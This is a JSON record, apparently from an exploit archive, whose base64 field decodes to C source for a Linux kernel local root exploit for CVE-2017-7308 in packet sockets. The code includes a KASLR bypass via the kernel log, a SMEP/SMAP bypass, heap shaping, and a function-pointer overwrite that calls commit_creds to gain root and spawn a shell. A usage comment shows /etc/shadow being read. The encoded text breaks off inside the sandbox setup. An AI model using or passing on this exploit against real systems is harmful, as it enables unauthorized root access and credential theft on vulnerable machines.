{
    "source": "exploit-database", 
    "exploit": "Ly8gQSBwcm9vZi1vZi1jb25jZXB0IGxvY2FsIHJvb3QgZXhwbG9pdCBmb3IgQ1ZFLTIwMTctNzMwOC4NCi8vIEluY2x1ZGVzIGEgU01FUCAmIFNNQVAgYnlwYXNzLg0KLy8gVGVzdGVkIG9uIDQuOC4wLTQxLWdlbmVyaWMgVWJ1bnR1IGtlcm5lbC4NCi8vIGh0dHBzOi8vZ2l0aHViLmNvbS94YWlyeS9rZXJuZWwtZXhwbG9pdHMvdHJlZS9tYXN0ZXIvQ1ZFLTIwMTctNzMwOA0KLy8NCi8vIFVzYWdlOg0KLy8gdXNlckB1YnVudHU6fiQgdW5hbWUgLWENCi8vIExpbnV4IHVidW50dSA0LjguMC00MS1nZW5lcmljICM0NH4xNi4wNC4xLVVidW50dSBTTVAgRnJpIE1hciAzIC4uLg0KLy8gdXNlckB1YnVudHU6fiQgZ2NjIHB3bi5jIC1vIHB3bg0KLy8gdXNlckB1YnVudHU6fiQgLi9wd24gDQovLyBbLl0gc3RhcnRpbmcNCi8vIFsuXSBuYW1lc3BhY2Ugc2FuZGJveCBzZXQgdXANCi8vIFsuXSBLQVNMUiBieXBhc3MgZW5hYmxlZCwgZ2V0dGluZyBrZXJuZWwgYWRkcg0KLy8gWy5dIGRvbmUsIGtlcm5lbCB0ZXh0OiAgIGZmZmZmZmZmODcwMDAwMDANCi8vIFsuXSBjb21taXRfY3JlZHM6ICAgICAgICBmZmZmZmZmZjg3MGE1Y2YwDQovLyBbLl0gcHJlcGFyZV9rZXJuZWxfY3JlZDogZmZmZmZmZmY4NzBhNjBlMA0KLy8gWy5dIG5hdGl2ZV93cml0ZV9jcjQ6ICAgIGZmZmZmZmZmODcwNjQyMTANCi8vIFsuXSBwYWRkaW5nIGhlYXANCi8vIFsuXSBkb25lLCBoZWFwIGlzIHBhZGRlZA0KLy8gWy5dIFNNRVAgJiBTTUFQIGJ5cGFzcyBlbmFibGVkLCB0dXJuaW5nIHRoZW0gb2ZmDQovLyBbLl0gZG9uZSwgU01FUCAmIFNNQVAgc2hvdWxkIGJlIG9mZiBub3cNCi8vIFsuXSBleGVjdXRpbmcgZ2V0IHJvb3QgcGF5bG9hZCAweDQwMTUxNg0KLy8gWy5dIGRvbmUsIHNob3VsZCBiZSByb290IG5vdw0KLy8gWy5dIGNoZWNraW5nIGlmIHdlIGdvdCByb290DQovLyBbK10gZ290IHIwMHQgXl9eDQovLyByb290QHVidW50dTovaG9tZS91c2VyIyBjYXQgL2V0Yy9zaGFkb3cNCi8vIHJvb3Q6IToxNzI0NjowOjk5OTk5Ojc6OjoNCi8vIGRhZW1vbjoqOjE3MjEyOjA6OTk5OTk6Nzo6Og0KLy8gYmluOio6MTcyMTI6MDo5OTk5OTo3Ojo6DQovLyAuLi4NCi8vDQovLyBBbmRyZXkgS29ub3ZhbG92IDxhbmRyZXlrbnZsQGdtYWlsLmNvbT4NCg0KI2RlZmluZSBfR05VX1NPVVJDRQ0KDQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHN0ZGFyZy5oPg0KI2luY2x1ZGUgPHN0ZGJvb2wuaD4NCiNpbmNsdWRlIDxzdGRkZWYuaD4NCiNpbmNsdWRlIDxzdGRpbnQuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHNjaGVkLmg+DQoNCiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4NCiNpbmNsdWRlIDxzeXMva2xvZy5oPg0KI2luY2x1ZGUgPHN5cy9tbWFuLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN5cy9zeXNjYWxsLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPGxpbnV4L2lmX3BhY2tldC5oPg0KI2luY2x1ZGUgPGxpbnV4L2lwLmg+DQojaW5jbHVkZSA8bGludXgvdWRwLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pZl9ldGhlci5oPg0KI2luY2x1ZGUgPG5ldC9pZi5oPg0KDQojZGVmaW5lIEVOQUJMRV9LQVNMUl9CWVBBU1MJMQ0KI2RlZmluZSBFTkFCTEVfU01FUF9TTUFQX0JZUEFTUwkxDQoNCi8vIFdpbGwgYmUgb3ZlcndyaXR0ZW4gaWYgRU5BQkxFX0tBU0xSX0JZUEFTUw0KdW5zaWduZWQgbG9uZyBLRVJORUxfQkFTRSA9IAkweGZmZmZmZmZmODEwMDAwMDB1bDsNCg0KLy8gS2VybmVsIHN5bWJvbCBvZmZzZXRzDQojZGVmaW5lIENPTU1JVF9DUkVEUwkJMHhhNWNmMHVsDQojZGVmaW5lIFBSRVBBUkVfS0VSTkVMX0NSRUQJMHhhNjBlMHVsDQojZGVmaW5lIE5BVElWRV9XUklURV9DUjQJMHg2NDIxMHVsDQoNCi8vIFNob3VsZCBoYXZlIFNNRVAgYW5kIFNNQVAgYml0cyBkaXNhYmxlZA0KI2RlZmluZSBDUjRfREVTSVJFRF9WQUxVRQkweDQwN2YwdWwNCg0KI2RlZmluZSBLTUFMTE9DX1BBRAkJNTEyDQojZGVmaW5lIFBBR0VBTExPQ19QQUQJCTEwMjQNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqIEtlcm5lbCBzdHJ1Y3RzICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdHlwZWRlZiB1aW50MzJfdCB1MzI7DQoNCi8vICQgcGFob2xlIC1DIGhsaXN0X25vZGUgLi92bWxpbnV4DQpzdHJ1Y3QgaGxpc3Rfbm9kZSB7DQoJc3RydWN0IGhsaXN0X25vZGUgKiAgICAgICAgbmV4dDsgICAgICAgICAgICAgICAgIC8qICAgICAwICAgICA4ICovDQoJc3RydWN0IGhsaXN0X25vZGUgKiAqICAgICAgcHByZXY7ICAgICAgICAgICAgICAgIC8qICAgICA4ICAgICA4ICovDQp9Ow0KDQovLyAkIHBhaG9sZSAtQyB0aW1lcl9saXN0IC4vdm1saW51eA0Kc3RydWN0IHRpbWVyX2xpc3Qgew0KCXN0cnVjdCBobGlzdF9ub2RlICAgICAgICAgIGVudHJ5OyAgICAgICAgICAgICAgICAvKiAgICAgMCAgICAxNiAqLw0KCWxvbmcgdW5zaWduZWQgaW50ICAgICAgICAgIGV4cGlyZXM7ICAgICAgICAgICAgICAvKiAgICAxNiAgICAgOCAqLw0KCXZvaWQgICAgICAgICAgICAgICAgICAgICAgICgqZnVuY3Rpb24pKGxvbmcgdW5zaWduZWQgaW50KTsgLyogICAgMjQgICAgIDggKi8NCglsb25nIHVuc2lnbmVkIGludCAgICAgICAgICBkYXRhOyAgICAgICAgICAgICAgICAgLyogICAgMzIgICAgIDggKi8NCgl1MzIgICAgICAgICAgICAgICAgICAgICAgICBmbGFnczsgICAgICAgICAgICAgICAgLyogICAgNDAgICAgIDQgKi8NCglpbnQgICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9waWQ7ICAgICAgICAgICAgLyogICAgNDQgICAgIDQgKi8NCgl2b2lkICogICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXRlOyAgICAgICAgICAgLyogICAgNDggICAgIDggKi8NCgljaGFyICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9jb21tWzE2XTsgICAgICAgLyogICAgNTYgICAgMTYgKi8NCn07DQoNCi8vIHBhY2tldF9zb2NrLT5yeF9yaW5nLT5wcmJfYmRxYy0+cmV0aXJlX2Jsa190aW1lcg0KI2RlZmluZSBUSU1FUl9PRkZTRVQJODk2DQoNCi8vIHBha2NldF9zb2NrLT54bWl0DQojZGVmaW5lIFhNSVRfT0ZGU0VUCTEzMDQNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogSGVscGVycyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2b2lkIHBhY2tldF9zb2NrZXRfcnhfcmluZ19pbml0KGludCBzLCB1bnNpZ25lZCBpbnQgYmxvY2tfc2l6ZSwNCgkJdW5zaWduZWQgaW50IGZyYW1lX3NpemUsIHVuc2lnbmVkIGludCBibG9ja19uciwNCgkJdW5zaWduZWQgaW50IHNpemVvZl9wcml2LCB1bnNpZ25lZCBpbnQgdGltZW91dCkgew0KCWludCB2ID0gVFBBQ0tFVF9WMzsNCglpbnQgcnYgPSBzZXRzb2Nrb3B0KHMsIFNPTF9QQUNLRVQsIFBBQ0tFVF9WRVJTSU9OLCAmdiwgc2l6ZW9mKHYpKTsNCglpZiAocnYgPCAwKSB7DQoJCXBlcnJvcigiWy1dIHNldHNvY2tvcHQoUEFDS0VUX1ZFUlNJT04pIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCglzdHJ1Y3QgdHBhY2tldF9yZXEzIHJlcTsNCgltZW1zZXQoJnJlcSwgMCwgc2l6ZW9mKHJlcSkpOw0KCXJlcS50cF9ibG9ja19zaXplID0gYmxvY2tfc2l6ZTsNCglyZXEudHBfZnJhbWVfc2l6ZSA9IGZyYW1lX3NpemU7DQoJcmVxLnRwX2Jsb2NrX25yID0gYmxvY2tfbnI7DQoJcmVxLnRwX2ZyYW1lX25yID0gKGJsb2NrX3NpemUgKiBibG9ja19ucikgLyBmcmFtZV9zaXplOw0KCXJlcS50cF9yZXRpcmVfYmxrX3RvdiA9IHRpbWVvdXQ7DQoJcmVxLnRwX3NpemVvZl9wcml2ID0gc2l6ZW9mX3ByaXY7DQoJcmVxLnRwX2ZlYXR1cmVfcmVxX3dvcmQgPSAwOw0KDQoJcnYgPSBzZXRzb2Nrb3B0KHMsIFNPTF9QQUNLRVQsIFBBQ0tFVF9SWF9SSU5HLCAmcmVxLCBzaXplb2YocmVxKSk7DQoJaWYgKHJ2IDwgMCkgew0KCQlwZXJyb3IoIlstXSBzZXRzb2Nrb3B0KFBBQ0tFVF9SWF9SSU5HKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQppbnQgcGFja2V0X3NvY2tldF9zZXR1cCh1bnNpZ25lZCBpbnQgYmxvY2tfc2l6ZSwgdW5zaWduZWQgaW50IGZyYW1lX3NpemUsDQoJCXVuc2lnbmVkIGludCBibG9ja19uciwgdW5zaWduZWQgaW50IHNpemVvZl9wcml2LCBpbnQgdGltZW91dCkgew0KCWludCBzID0gc29ja2V0KEFGX1BBQ0tFVCwgU09DS19SQVcsIGh0b25zKEVUSF9QX0FMTCkpOw0KCWlmIChzIDwgMCkgew0KCQlwZXJyb3IoIlstXSBzb2NrZXQoQUZfUEFDS0VUKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJcGFja2V0X3NvY2tldF9yeF9yaW5nX2luaXQocywgYmxvY2tfc2l6ZSwgZnJhbWVfc2l6ZSwgYmxvY2tfbnIsDQoJCXNpemVvZl9wcml2LCB0aW1lb3V0KTsNCg0KCXN0cnVjdCBzb2NrYWRkcl9sbCBzYTsNCgltZW1zZXQoJnNhLCAwLCBzaXplb2Yoc2EpKTsNCglzYS5zbGxfZmFtaWx5ID0gUEZfUEFDS0VUOw0KCXNhLnNsbF9wcm90b2NvbCA9IGh0b25zKEVUSF9QX0FMTCk7DQoJc2Euc2xsX2lmaW5kZXggPSBpZl9uYW1ldG9pbmRleCgibG8iKTsNCglzYS5zbGxfaGF0eXBlID0gMDsNCglzYS5zbGxfcGt0dHlwZSA9IDA7DQoJc2Euc2xsX2hhbGVuID0gMDsNCg0KCWludCBydiA9IGJpbmQocywgKHN0cnVjdCBzb2NrYWRkciAqKSZzYSwgc2l6ZW9mKHNhKSk7DQoJaWYgKHJ2IDwgMCkgew0KCQlwZXJyb3IoIlstXSBiaW5kKEFGX1BBQ0tFVCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXJldHVybiBzOw0KfQ0KDQp2b2lkIHBhY2tldF9zb2NrZXRfc2VuZChpbnQgcywgY2hhciAqYnVmZmVyLCBpbnQgc2l6ZSkgew0KCXN0cnVjdCBzb2NrYWRkcl9sbCBzYTsNCgltZW1zZXQoJnNhLCAwLCBzaXplb2Yoc2EpKTsNCglzYS5zbGxfaWZpbmRleCA9IGlmX25hbWV0b2luZGV4KCJsbyIpOw0KCXNhLnNsbF9oYWxlbiA9IEVUSF9BTEVOOw0KDQoJaWYgKHNlbmR0byhzLCBidWZmZXIsIHNpemUsIDAsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2EsDQoJCQlzaXplb2Yoc2EpKSA8IDApIHsNCgkJcGVycm9yKCJbLV0gc2VuZHRvKFNPQ0tfUkFXKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQp2b2lkIGxvb3BiYWNrX3NlbmQoY2hhciAqYnVmZmVyLCBpbnQgc2l6ZSkgew0KCWludCBzID0gc29ja2V0KEFGX1BBQ0tFVCwgU09DS19SQVcsIElQUFJPVE9fUkFXKTsNCglpZiAocyA9PSAtMSkgew0KCQlwZXJyb3IoIlstXSBzb2NrZXQoU09DS19SQVcpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCglwYWNrZXRfc29ja2V0X3NlbmQocywgYnVmZmVyLCBzaXplKTsNCn0NCg0KaW50IHBhY2tldF9zb2NrX2ttYWxsb2MoKSB7DQoJaW50IHMgPSBzb2NrZXQoQUZfUEFDS0VULCBTT0NLX0RHUkFNLCBodG9ucyhFVEhfUF9BUlApKTsNCglpZiAocyA9PSAtMSkgew0KCQlwZXJyb3IoIlstXSBzb2NrZXQoU09DS19ER1JBTSkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCglyZXR1cm4gczsNCn0NCg0Kdm9pZCBwYWNrZXRfc29ja190aW1lcl9zY2hlZHVsZShpbnQgcywgaW50IHRpbWVvdXQpIHsNCglwYWNrZXRfc29ja2V0X3J4X3JpbmdfaW5pdChzLCAweDEwMDAsIDB4MTAwMCwgMSwgMCwgdGltZW91dCk7DQp9DQoNCnZvaWQgcGFja2V0X3NvY2tfaWRfbWF0Y2hfdHJpZ2dlcihpbnQgcykgew0KCWNoYXIgYnVmZmVyWzE2XTsNCglwYWNrZXRfc29ja2V0X3NlbmQocywgJmJ1ZmZlclswXSwgc2l6ZW9mKGJ1ZmZlcikpOw0KfQ0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiBUcmlnZ2VyICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiNkZWZpbmUgQUxJR04oeCwgYSkJCQlfX0FMSUdOX0tFUk5FTCgoeCksIChhKSkNCiNkZWZpbmUgX19BTElHTl9LRVJORUwoeCwgYSkJCV9fQUxJR05fS0VSTkVMX01BU0soeCwgKHR5cGVvZih4KSkoYSkgLSAxKQ0KI2RlZmluZSBfX0FMSUdOX0tFUk5FTF9NQVNLKHgsIG1hc2spCSgoKHgpICsgKG1hc2spKSAmIH4obWFzaykpDQoNCiNkZWZpbmUgVjNfQUxJR05NRU5UCSg4KQ0KI2RlZmluZSBCTEtfSERSX0xFTgkoQUxJR04oc2l6ZW9mKHN0cnVjdCB0cGFja2V0X2Jsb2NrX2Rlc2MpLCBWM19BTElHTk1FTlQpKQ0KDQojZGVmaW5lIEVUSF9IRFJfTEVOCXNpemVvZihzdHJ1Y3QgZXRoaGRyKQ0KI2RlZmluZSBJUF9IRFJfTEVOCXNpemVvZihzdHJ1Y3QgaXBoZHIpDQojZGVmaW5lIFVEUF9IRFJfTEVOCXNpemVvZihzdHJ1Y3QgdWRwaGRyKQ0KDQojZGVmaW5lIFVEUF9IRFJfTEVOX0ZVTEwJKEVUSF9IRFJfTEVOICsgSVBfSERSX0xFTiArIFVEUF9IRFJfTEVOKQ0KDQppbnQgb29iX3NldHVwKGludCBvZmZzZXQpIHsNCgl1bnNpZ25lZCBpbnQgbWFjbGVuID0gRVRIX0hEUl9MRU47DQoJdW5zaWduZWQgaW50IG5ldG9mZiA9IFRQQUNLRVRfQUxJR04oVFBBQ0tFVDNfSERSTEVOICsNCgkJCQkobWFjbGVuIDwgMTYgPyAxNiA6IG1hY2xlbikpOw0KCXVuc2lnbmVkIGludCBtYWNvZmYgPSBuZXRvZmYgLSBtYWNsZW47DQoJdW5zaWduZWQgaW50IHNpemVvZl9wcml2ID0gKDF1PDwzMSkgKyAoMXU8PDMwKSArDQoJCTB4ODAwMCAtIEJMS19IRFJfTEVOIC0gbWFjb2ZmICsgb2Zmc2V0Ow0KCXJldHVybiBwYWNrZXRfc29ja2V0X3NldHVwKDB4ODAwMCwgMjA0OCwgMiwgc2l6ZW9mX3ByaXYsIDEwMCk7DQp9DQoNCnZvaWQgb29iX3dyaXRlKGNoYXIgKmJ1ZmZlciwgaW50IHNpemUpIHsNCglsb29wYmFja19zZW5kKGJ1ZmZlciwgc2l6ZSk7DQp9DQoNCnZvaWQgb29iX3RpbWVyX2V4ZWN1dGUodm9pZCAqZnVuYywgdW5zaWduZWQgbG9uZyBhcmcpIHsNCglvb2Jfc2V0dXAoMjA0OCArIFRJTUVSX09GRlNFVCAtIDgpOw0KDQoJaW50IGk7DQoJZm9yIChpID0gMDsgaSA8IDMyOyBpKyspIHsNCgkJaW50IHRpbWVyID0gcGFja2V0X3NvY2tfa21hbGxvYygpOw0KCQlwYWNrZXRfc29ja190aW1lcl9zY2hlZHVsZSh0aW1lciwgMTAwMCk7DQoJfQ0KDQoJY2hhciBidWZmZXJbMjA0OF07DQoJbWVtc2V0KCZidWZmZXJbMF0sIDAsIHNpemVvZihidWZmZXIpKTsNCg0KCXN0cnVjdCB0aW1lcl9saXN0ICp0aW1lciA9IChzdHJ1Y3QgdGltZXJfbGlzdCAqKSZidWZmZXJbOF07DQoJdGltZXItPmZ1bmN0aW9uID0gZnVuYzsNCgl0aW1lci0+ZGF0YSA9IGFyZzsNCgl0aW1lci0+ZmxhZ3MgPSAxOw0KDQoJb29iX3dyaXRlKCZidWZmZXJbMF0gKyAyLCBzaXplb2YoKnRpbWVyKSArIDggLSAyKTsNCg0KCXNsZWVwKDEpOw0KfQ0KDQp2b2lkIG9vYl9pZF9tYXRjaF9leGVjdXRlKHZvaWQgKmZ1bmMpIHsNCglpbnQgcyA9IG9vYl9zZXR1cCgyMDQ4ICsgWE1JVF9PRkZTRVQgLSA2NCk7DQoNCglpbnQgcHNbMzJdOw0KDQoJaW50IGk7DQoJZm9yIChpID0gMDsgaSA8IDMyOyBpKyspDQoJCXBzW2ldID0gcGFja2V0X3NvY2tfa21hbGxvYygpOw0KDQoJY2hhciBidWZmZXJbMjA0OF07DQoJbWVtc2V0KCZidWZmZXJbMF0sIDAsIDIwNDgpOw0KDQoJdm9pZCAqKnhtaXQgPSAodm9pZCAqKikmYnVmZmVyWzY0XTsNCgkqeG1pdCA9IGZ1bmM7DQoNCglvb2Jfd3JpdGUoKGNoYXIgKikmYnVmZmVyWzBdICsgMiwgc2l6ZW9mKCp4bWl0KSArIDY0IC0gMik7DQoNCglmb3IgKGkgPSAwOyBpIDwgMzI7IGkrKykNCgkJcGFja2V0X3NvY2tfaWRfbWF0Y2hfdHJpZ2dlcihwc1tpXSk7DQp9DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiBIZWFwIHNoYXBpbmcgKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnZvaWQga21hbGxvY19wYWQoaW50IGNvdW50KSB7DQoJaW50IGk7DQoJZm9yIChpID0gMDsgaSA8IGNvdW50OyBpKyspDQoJCXBhY2tldF9zb2NrX2ttYWxsb2MoKTsNCn0NCg0Kdm9pZCBwYWdlYWxsb2NfcGFkKGludCBjb3VudCkgew0KCXBhY2tldF9zb2NrZXRfc2V0dXAoMHg4MDAwLCAyMDQ4LCBjb3VudCwgMCwgMTAwKTsNCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogR2V0dGluZyByb290ICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdHlwZWRlZiB1bnNpZ25lZCBsb25nIF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKiBfY29tbWl0X2NyZWRzKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KdHlwZWRlZiB1bnNpZ25lZCBsb25nIF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKiBfcHJlcGFyZV9rZXJuZWxfY3JlZCkodW5zaWduZWQgbG9uZyBjcmVkKTsNCg0Kdm9pZCBnZXRfcm9vdF9wYXlsb2FkKHZvaWQpIHsNCgkoKF9jb21taXRfY3JlZHMpKEtFUk5FTF9CQVNFICsgQ09NTUlUX0NSRURTKSkoDQoJCSgoX3ByZXBhcmVfa2VybmVsX2NyZWQpKEtFUk5FTF9CQVNFICsgUFJFUEFSRV9LRVJORUxfQ1JFRCkpKDApDQoJKTsNCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiBTaW1wbGUgS0FTTFIgYnlwYXNzICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiNkZWZpbmUgU1lTTE9HX0FDVElPTl9SRUFEX0FMTCAzDQojZGVmaW5lIFNZU0xPR19BQ1RJT05fU0laRV9CVUZGRVIgMTANCg0KdW5zaWduZWQgbG9uZyBnZXRfa2VybmVsX2FkZHIoKSB7DQoJaW50IHNpemUgPSBrbG9nY3RsKFNZU0xPR19BQ1RJT05fU0laRV9CVUZGRVIsIDAsIDApOw0KCWlmIChzaXplID09IC0xKSB7DQoJCXBlcnJvcigiWy1dIGtsb2djdGwoU1lTTE9HX0FDVElPTl9TSVpFX0JVRkZFUikiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXNpemUgPSAoc2l6ZSAvIGdldHBhZ2VzaXplKCkgKyAxKSAqIGdldHBhZ2VzaXplKCk7DQoJY2hhciAqYnVmZmVyID0gKGNoYXIgKiltbWFwKE5VTEwsIHNpemUsIFBST1RfUkVBRHxQUk9UX1dSSVRFLA0KCQlNQVBfUFJJVkFURXxNQVBfQU5PTllNT1VTLCAtMSwgMCk7DQoNCglzaXplID0ga2xvZ2N0bChTWVNMT0dfQUNUSU9OX1JFQURfQUxMLCAmYnVmZmVyWzBdLCBzaXplKTsNCglpZiAoc2l6ZSA9PSAtMSkgew0KCQlwZXJyb3IoIlstXSBrbG9nY3RsKFNZU0xPR19BQ1RJT05fUkVBRF9BTEwpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCgljb25zdCBjaGFyICpuZWVkbGUxID0gIkZyZWVpbmcgU01QIjsNCgljaGFyICpzdWJzdHIgPSAoY2hhciAqKW1lbW1lbSgmYnVmZmVyWzBdLCBzaXplLCBuZWVkbGUxLCBzdHJsZW4obmVlZGxlMSkpOw0KCWlmIChzdWJzdHIgPT0gTlVMTCkgew0KCQlmcHJpbnRmKHN0ZGVyciwgIlstXSBzdWJzdHJpbmcgJyVzJyBub3QgZm91bmQgaW4gZG1lc2dcbiIsIG5lZWRsZTEpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJZm9yIChzaXplID0gMDsgc3Vic3RyW3NpemVdICE9ICdcbic7IHNpemUrKyk7DQoNCgljb25zdCBjaGFyICpuZWVkbGUyID0gImZmZmYiOw0KCXN1YnN0ciA9IChjaGFyICopbWVtbWVtKCZzdWJzdHJbMF0sIHNpemUsIG5lZWRsZTIsIHN0cmxlbihuZWVkbGUyKSk7DQoJaWYgKHN1YnN0ciA9PSBOVUxMKSB7DQoJCWZwcmludGYoc3RkZXJyLCAiWy1dIHN1YnN0cmluZyAnJXMnIG5vdCBmb3VuZCBpbiBkbWVzZ1xuIiwgbmVlZGxlMik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCgljaGFyICplbmRwdHIgPSAmc3Vic3RyWzE2XTsNCgl1bnNpZ25lZCBsb25nIHIgPSBzdHJ0b3VsKCZzdWJzdHJbMF0sICZlbmRwdHIsIDE2KTsNCg0KCXIgJj0gMHhmZmZmZmZmZmZmZjAwMDAwdWw7DQoJciAtPSAweDEwMDAwMDB1bDsNCg0KCXJldHVybiByOw0KfQ0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogTWFpbiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2b2lkIGV4ZWNfc2hlbGwoKSB7DQoJY2hhciAqc2hlbGwgPSAiL2Jpbi9iYXNoIjsNCgljaGFyICphcmdzW10gPSB7c2hlbGwsICItaSIsIE5VTEx9Ow0KCWV4ZWN2ZShzaGVsbCwgYXJncywgTlVMTCk7DQp9DQoNCnZvaWQgZm9ya19zaGVsbCgpIHsNCglwaWRfdCBydjsNCg0KCXJ2ID0gZm9yaygpOw0KCWlmIChydiA9PSAtMSkgew0KCQlwZXJyb3IoIlstXSBmb3JrKCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCWlmIChydiA9PSAwKSB7DQoJCWV4ZWNfc2hlbGwoKTsNCgl9DQp9DQoNCmJvb2wgaXNfcm9vdCgpIHsNCgkvLyBXZSBjYW4ndCBzaW1wbGUgY2hlY2sgdWlkLCBzaW5jZSB3ZSdyZSBydW5uaW5nIGluc2lkZSBhIG5hbWVzcGFjZQ0KCS8vIHdpdGggdWlkIHNldCB0byAwLiBUcnkgb3BlbmluZyAvZXRjL3NoYWRvdyBpbnN0ZWFkLg0KCWludCBmZCA9IG9wZW4oIi9ldGMvc2hhZG93IiwgT19SRE9OTFkpOw0KCWlmIChmZCA9PSAtMSkNCgkJcmV0dXJuIGZhbHNlOw0KCWNsb3NlKGZkKTsNCglyZXR1cm4gdHJ1ZTsNCn0NCg0Kdm9pZCBjaGVja19yb290KCkgew0KCXByaW50ZigiWy5dIGNoZWNraW5nIGlmIHdlIGdvdCByb290XG4iKTsNCg0KCWlmICghaXNfcm9vdCgpKSB7DQoJCXByaW50ZigiWy1dIHNvbWV0aGluZyB3ZW50IHdyb25nID0oXG4iKTsNCgkJcmV0dXJuOw0KCX0NCg0KCXByaW50ZigiWytdIGdvdCByMDB0IF5fXlxuIik7DQoNCgkvLyBGb3JrIGFuZCBleGVjIGluc3RlYWQgb2YganVzdCBkb2luZyB0aGUgZXhlYyB0byBhdm9pZCBwb3RlbnRpYWwNCgkvLyBtZW1vcnkgY29ycnVwdGlvbnMgd2hlbiBjbG9zaW5nIHBhY2tldCBzb2NrZXRzLg0KCWZvcmtfc2hlbGwoKTsNCn0NCg0KYm9vbCB3cml0ZV9maWxlKGNvbnN0IGNoYXIqIGZpbGUsIGNvbnN0IGNoYXIqIHdoYXQsIC4uLikgew0KCWNoYXIgYnVmWzEwMjRdOw0KCXZhX2xpc3QgYXJnczsNCgl2YV9zdGFydChhcmdzLCB3aGF0KTsNCgl2c25wcmludGYoYnVmLCBzaXplb2YoYnVmKSwgd2hhdCwgYXJncyk7DQoJdmFfZW5kKGFyZ3MpOw0KCWJ1ZltzaXplb2YoYnVmKSAtIDFdID0gMDsNCglpbnQgbGVuID0gc3RybGVuKGJ1Zik7DQoNCglpbnQgZmQgPSBvcGVuKGZpbGUsIE9fV1JPTkxZIHwgT19DTE9FWEVDKTsNCglpZiAoZmQgPT0gLTEpDQoJCXJldHVybiBmYWxzZTsNCglpZiAod3JpdGUoZmQsIGJ1ZiwgbGVuKSAhPSBsZW4pIHsNCgkJY2xvc2UoZmQpOw0KCQlyZXR1cm4gZmFsc2U7DQoJfQ0KCWNsb3NlKGZkKTsNCglyZXR1cm4gdHJ1ZTsNCn0NCg0Kdm9pZCBzZXR1cF9zYW5kYm94KCkgew0KCWludCByZWFsX3VpZCA9IGdldHVpZCgpOw0KCWludCByZWFsX2dpZCA9IGdldGdpZCgpOw0KDQogICAgICAgIGlmICh1bnNoYXJlKENMT05FX05FV1VTRVIpICE9IDApIHsNCgkJcGVycm9yKCJbLV0gdW5zaGFyZShDTE9ORV9ORVdVU0VSKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQogICAgICAgIGlmICh1bnNoYXJlKENMT05FX05FV05FVCkgIT0gMCkgew0KCQlwZXJyb3IoIlstXSB1bnNoYXJlKENMT05FX05FV1VTRVIpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCglpZiAoIXdyaXRlX2ZpbGUoIi9wcm9jL3NlbGYvc2V0Z3JvdXBzIiwgImRlbnkiKSkgew0KCQlwZXJyb3IoIlstXSB3cml0ZV9maWxlKC9wcm9jL3NlbGYvc2V0X2dyb3VwcykiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCglpZiAoIXdyaXRlX2ZpbGUoIi9wcm9jL3NlbGYvdWlkX21hcCIsICIwICVkIDFcbiIsIHJlYWxfdWlkKSl7DQoJCXBlcnJvcigiWy1dIHdyaXRlX2ZpbGUoL3Byb2Mvc2VsZi91aWRfbWFwKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KCWlmICghd3JpdGVfZmlsZSgiL3Byb2Mvc2VsZi9naWRfbWFwIiwgIjAgJWQgMVxuIiwgcmVhbF9naWQpKSB7DQoJCXBlcnJvcigiWy1dIHdyaXRlX2ZpbGUoL3Byb2Mvc2V